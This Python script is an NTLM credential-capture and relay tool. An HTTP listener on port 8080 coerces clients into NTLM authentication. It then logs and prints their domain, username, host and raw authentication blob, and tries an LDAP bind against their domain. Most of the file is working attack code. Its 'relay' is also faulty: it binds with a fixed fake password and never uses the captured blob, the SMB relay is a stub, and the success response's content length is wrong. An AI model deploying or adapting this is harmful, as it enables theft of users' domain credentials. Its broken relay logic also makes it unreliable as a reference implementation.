import base64
import socketserver
import threading
import argparse
import datetime
import struct
import socket
from impacket.ntlm import NTLMAuthChallenge
import ldap3

# Stores captured NTLM credentials
captured_creds = []
relay_mode = []  # Filled by argparse
logfile = "relay_log.txt"
debug_mode = False  # Default disabled


def log_relay_event(msg):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(logfile, "a") as f:
        f.write(f"[{timestamp}] {msg}\n")


def relay_to_ldap(domain, username, ntlm_blob):
    if 'ldap' not in relay_mode:
        return
    print(f"[*] Attempting LDAP bind to {domain} with captured NTLM...")
    try:
        ldap_server = ldap3.Server(f"{domain}", get_info=ldap3.ALL)
        conn = ldap3.Connection(ldap_server, user=f"{domain}\\{username}", password="fakepass", authentication=ldap3.NTLM)
        if conn.bind():
            msg = f"[+] LDAP bind success for {domain}\\{username}"
            print(msg)
            log_relay_event(msg)
            conn.unbind()
        else:
            msg = f"[-] LDAP bind failed: {conn.result['description']}"
            print(msg)
            log_relay_event(msg)
    except Exception as e:
        msg = f"[!] LDAP relay error: {e}"
        print(msg)
        log_relay_event(msg)


def relay_to_smb(domain, username, ntlm_blob):
    if 'smb' not in relay_mode:
        return
    print(f"[*] [STUB] Attempting SMB relay for {domain}\\{username} (not implemented yet)")
    log_relay_event(f"[*] [STUB] SMB relay called for {domain}\\{username}")


def parse_string(blob, offset):
    length = struct.unpack("<H", blob[offset:offset+2])[0]
    pointer = struct.unpack("<I", blob[offset+4:offset+8])[0]
    if pointer == 0 or length == 0:
        return ""
    return blob[pointer:pointer+length].decode('utf-16le', errors='ignore')


class NTLMRelayHandler(socketserver.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        headers = self.data.decode(errors='ignore')

        if "Authorization: NTLM" not in headers:
            self.send_401()
            return

        try:
            ntlm_base64 = headers.split("Authorization: NTLM ")[1].split("\r\n")[0]
            ntlm_bytes = base64.b64decode(ntlm_base64)

            if ntlm_bytes[8:12] == b'\x01\x00\x00\x00':
                print("[*] Received NTLM Type 1 message")
                self.send_ntlm_challenge()
            elif ntlm_bytes[8:12] == b'\x03\x00\x00\x00':
                print("[*] Received NTLM Type 3 message")
                self.store_ntlm_authenticate(ntlm_bytes)
                self.send_success()
            else:
                print("[-] Unknown NTLM message type")
        except Exception as e:
            print(f"[!] Error parsing NTLM: {e}")

    def send_401(self):
        response = (
            "HTTP/1.1 401 Unauthorized\r\n"
            "WWW-Authenticate: NTLM\r\n"
            "Content-Length: 0\r\n\r\n"
        )
        self.request.sendall(response.encode())

    def send_ntlm_challenge(self):
        target_name = b"Responder"
        signature = b"NTLMSSP\x00"
        message_type = struct.pack("<I", 2)

        target_name_len = struct.pack("<H", len(target_name))
        target_name_maxlen = struct.pack("<H", len(target_name))
        target_name_offset = struct.pack("<I", 64)

        negotiate_flags = struct.pack("<I", 0xE20882B7)
        server_challenge = b"\x11\x22\x33\x44\x55\x66\x77\x88"
        reserved = b"\x00" * 8

        av_pairs = (
            b"\x02\x00" + struct.pack("<H", len(target_name)) + target_name +
            b"\x01\x00\x00\x00" +
            b"\x00\x00\x00\x00"
        )
        av_len = struct.pack("<H", len(av_pairs))
        av_maxlen = struct.pack("<H", len(av_pairs))
        av_offset = struct.pack("<I", 64 + len(target_name))

        version = b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"

        type2 = (
            signature +
            message_type +
            target_name_len + target_name_maxlen + target_name_offset +
            struct.pack("<I", 0xE20882B7) +
            server_challenge +
            reserved +
            av_len + av_maxlen + av_offset +
            version +
            target_name +
            av_pairs
        )

        b64 = base64.b64encode(type2).decode()
        if debug_mode:
            with open("debug_ntlm_type2.b64", "w") as f:
                f.write(b64)

        response = (
            "HTTP/1.1 401 Unauthorized\r\n"
            f"WWW-Authenticate: NTLM {b64}\r\n"
            "Content-Length: 0\r\n\r\n"
        )
        self.request.sendall(response.encode())

    def store_ntlm_authenticate(self, blob):
        domain = parse_string(blob, 28)
        username = parse_string(blob, 36)
        host = parse_string(blob, 44)

        print(f"[+] Captured NTLM Auth: {domain}\\{username} from {host}")
        captured_creds.append({
            'domain': domain,
            'username': username,
            'host': host,
            'raw': base64.b64encode(blob).decode()
        })

        relay_to_ldap(domain, username, blob)
        relay_to_smb(domain, username, blob)

    def send_success(self):
        response = (
            "HTTP/1.1 200 OK\r\n"
            "Content-Type: text/html\r\n"
            "Content-Length: 46\r\n"
            "\r\n"
            "<html><body>Login captured. Thank you.</body></html>"
        )
        self.request.sendall(response.encode())


class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True


def start_server(host='0.0.0.0', port=8080):
    with ThreadedTCPServer((host, port), NTLMRelayHandler) as server:
        print(f"[+] HTTP NTLM listener started on {host}:{port}")
        server.serve_forever()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="NTLM HTTP Listener + Relay")
    parser.add_argument("--relay", choices=['ldap', 'smb', 'both'], default='ldap', help="Relay mode to enable")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode (logs NTLM Type 2 challenge to .b64)")
    args = parser.parse_args()

    if args.relay == 'both':
        relay_mode = ['ldap', 'smb']
    else:
        relay_mode = [args.relay]

    if args.debug:
        debug_mode = True

    try:
        start_server()
    except KeyboardInterrupt:
        print("\n[!] Shutting down listener...")
        for cred in captured_creds:
            print(f"[*] {cred['domain']}\\{cred['username']} from {cred['host']}")
            print(f"[*] Base64 NTLM: {cred['raw']}\n")
